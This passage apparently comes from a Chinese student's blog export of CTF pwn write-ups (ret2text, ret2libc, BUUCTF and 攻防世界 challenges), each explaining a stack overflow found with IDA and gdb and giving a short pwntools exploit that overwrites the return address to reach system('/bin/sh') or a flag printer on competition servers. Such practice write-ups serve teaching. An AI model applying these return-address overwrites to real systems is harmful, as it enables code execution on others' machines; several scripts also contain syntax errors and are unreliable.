-<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>这一部分我发现一个很坑的地方，如果我们用ctf-wilki上的方法，那么我们在gdb调试设断点的时候就不能设 </p>
-<blockquote>
-<p>b read</p>
-</blockquote>
-<p>这样设的话我们直接就进入到read函数里了，那就无法看到储存数据的寄存器（不管是什么）距rsp或者rbp的偏移了<br>并且，此时已经开始进入read子函数，即已经分配了新的栈帧了，rsp已经移动，再去计算rsp和rbp的差值则会不准确</p>
-<blockquote>
-<p>b  *0x4011be</p>
-</blockquote>
-<p>我们应该这样设断点，这样就停止在进入read函数之前，不仅可以看到相对偏移,还能计算出rbp-rsp<br><img data-src="https://pic3.zhimg.com/80/v2-9efe6dca6df2fee543e1ebc2027b17de_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-0d752265119152e7f608595ea4255d90_1440w.webp"><br>得出rsp和rsi 0x7fffffffddd0,rbp为0x7fffffffdde0,计算得距rbp偏移量就为0x7fffffffdde0-0x7fffffffddd0<br>那么再加上rbp求得为0x10+8</p>
-<p>还可以暴力求得  <del>懒得计算偏移量的话</del><br><img data-src="https://pic4.zhimg.com/80/v2-c7ec27fdfb682541c8a7d2aeb8e4c663_1440w.webp"></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>, <span class="number">30574</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 000000000401176</span><br><span class="line">payload = b <span class="string">&#x27; a &#x27;</span> * <span class="number">0x18</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好奇怪为什么官方的WP可以直接反汇编成正常的函数？<br>搜了一下好像可以手动添加标签,<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">这篇文章</a>教了一下这么回复库函数名，但是看不懂……</p>
-<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p><img data-src="https://pic4.zhimg.com/80/v2-23c72811fac836cd0c8980516e1acc83_1440w.webp"><br>得到shell后发现并没有办法显示出flag，问题就在之前的那个close(1)因为汇编代码中有这样一句</p>
-<blockquote>
-<p>mov     edi, 1</p>
-</blockquote>
-<p>所以认为close()括号里的参数时1<br>这时候需要使用命令让shell能够正常回显</p>
-<blockquote>
-<p>exec 1&gt;&amp;0</p>
-</blockquote>
-<p>累死了，终于拿到flag<br><img data-src="https://pic2.zhimg.com/80/v2-ee060de7086e6945edf7fda074674fa5_1440w.webp"></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>hgame</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week2 T5</title>
-    <url>/posts/46e9d6ae/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-cgpwn2"><a href="#T5-cgpwn2" class="headerlink" title="T5 cgpwn2"></a>T5 cgpwn2</h2><blockquote>
-<p>2023-01-09WP<br>攻防世界 pwn题</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX保护</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中打开window发现这题又是一个找不到&#x2F;bin&#x2F;sh的<br>但是在pwn函数中还是找到了system函数的<br><img data-src="https://pic4.zhimg.com/80/v2-068880d6f0f1427b812cd98bee561577_1440w.webp"><br>然后我们来看hello函数的反汇编代码<br><img data-src="https://pic4.zhimg.com/80/v2-c5dd01b36ac83fcdc19cf8ed3f804d0b_1440w.webp"><br>好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的<br>首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name<br>然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制<br>其中name是bss段的一个大小为34的区域，<br><img data-src="https://pic3.zhimg.com/80/v2-a6b3d88fcbe601a724cad07d655b85f6_1440w.webp"><br>s是长度为0x26个字节的区域<br><img data-src="https://pic1.zhimg.com/80/v2-a33446043ab1e9de86ee374db4c9dd28_1440w.webp"><br>于是我们可以向name区域输入&#x2F;bin&#x2F;sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(’61.147.171.105‘，51582)</span><br><span class="line">target = 0x804855A</span><br><span class="line">binsh = 0x804A080</span><br><span class="line">payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #覆盖s和ebp的数据</span><br><span class="line">                 + p32(target) + p32(binsh)#返回gets函数的地址和参数</span><br><span class="line">a = r.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)#向fget函数发送字符串</span><br><span class="line">a = r.recvuntil(&#x27;:\n&#x27;)#等待接受到括号内的信息后再运行下面的内容</span><br><span class="line">p.sendline(payload)#发送payload</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>好像不要a &#x3D; r.recvuntil(‘e\n’)，a &#x3D; r.recvuntil(‘:\n’)也可以……</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week2 T4</title>
-    <url>/posts/31eee638/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
-<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>这篇<a href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">文章</a>和这篇<a href="https://www.jianshu.com/p/4928e726a43f">博客</a>挺不错的<br>还有<a href="https://blog.csdn.net/ATFWUS/article/details/104565483">这篇</a></p>
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>ctf-wiki的exp是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>[‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？<br>好像看到有博客说是为了堆栈平衡<br>其实就是用了两个gadget<br>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week2 T3</title>
-    <url>/posts/af8a739b/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
-<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x00-ctf-wiki中的原理解释"><a href="#0x00-ctf-wiki中的原理解释" class="headerlink" title="0x00  ctf-wiki中的原理解释"></a>0x00  ctf-wiki中的原理解释</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了<br><del>我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起</del></p>
-<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>也可以直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处，<br>但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数<br>一个plt表和got表的<a href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">教学文章</a></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week2 T2</title>
-    <url>/posts/d88d430d/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2text-上题的另一种解法"><a href="#T2-ret2text-上题的另一种解法" class="headerlink" title="T2 ret2text(上题的另一种解法)"></a>T2 ret2text(上题的另一种解法)</h2><blockquote>
-<p>2023-01-09WP<br>网上看到另一种暴力解法感觉很不错于是自己做过了一遍<br><strong>0x01</strong>与<strong>0x02</strong>跟上题相同</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week2 T1</title>
-    <url>/posts/418412b7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
-<p>2023-01-09WP<br>ctf-wiki基础rop</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br>只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week1 T5</title>
-    <url>/posts/545c7940/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-pwn1-sctf-2016"><a href="#T5-pwn1-sctf-2016" class="headerlink" title="T5 pwn1_sctf_2016"></a>T5 pwn1_sctf_2016</h2><blockquote>
-<p>2023-01-09WP<br>BUUCTF pwn第五题</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit,开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-746f7f97d1877dc7901815486c36d846_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中shift+f12可以找到有个cat flag.txt<br><img data-src="https://pic1.zhimg.com/80/v2-9d38aa862b9408f86802c4dca80493a4_1440w.webp"><br>可以利用这个函数来输出flag<br>查看调用它的函数并记下它的地址0x8048F0D<br><img data-src="https://pic3.zhimg.com/v2-107e624689b731fc197a5f737bac2106_r.jpg"><br>继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数<br><img data-src="https://pic3.zhimg.com/80/v2-fc51095b6ef69a5c78254f87a3dcea9a_1440w.webp"><br>但是fget函数限制了输入长度为32，好像并不能构成栈溢出<br>于是我就蒙了，fget后面的伪代码又不是看得很懂……<br>查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you<br>这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的s<br>payload再覆盖掉ebp再加上get_flag函数的地址就可以了<br>最后看大佬博客半懂半不懂地写了个exp<br>（这篇<a href="https://www.freebuf.com/vuls/336623.html">博客</a>感觉算是比较详细的，它甚至是直接分析汇编语言）</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)</span><br><span class="line">flag_addre = 0x08048F0D</span><br><span class="line">payload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>还是不是很懂到底是怎么看出来是把i换成you的<br>还有就是这个replace函数的参数列表中那个v4代表的是什么<br><img data-src="https://pic3.zhimg.com/80/v2-cc78aea540c7bae381b3cfe547853dae_1440w.webp"><br>并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了<br><del>直接点进去看replace的源码好像又不科学，根本看不懂……</del><br>补充：C++的伪代码就是比较难看，不能只看IDA了，要结合gdb调试去猜i换成you的替换</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week1 T4</title>
-    <url>/posts/235b49d6/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
-<p>2023-01-08WP<br>BUUCTF pwn第四题</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
-<p><del>直接写11.28125好像没用……</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>网上看到一篇<a href="https://blog.csdn.net/qq_41560595/article/details/108783758">博客</a>是直接从IDA中找十六进制数的<br>pwn得flag<br>还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>这就让我有<strong>一些疑惑：</strong>就这一题来说，开启了NX有没有让题目难度增加呢？</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week1 T3</title>
-    <url>/posts/bd3fdc75/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
-<p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
-<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
-<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
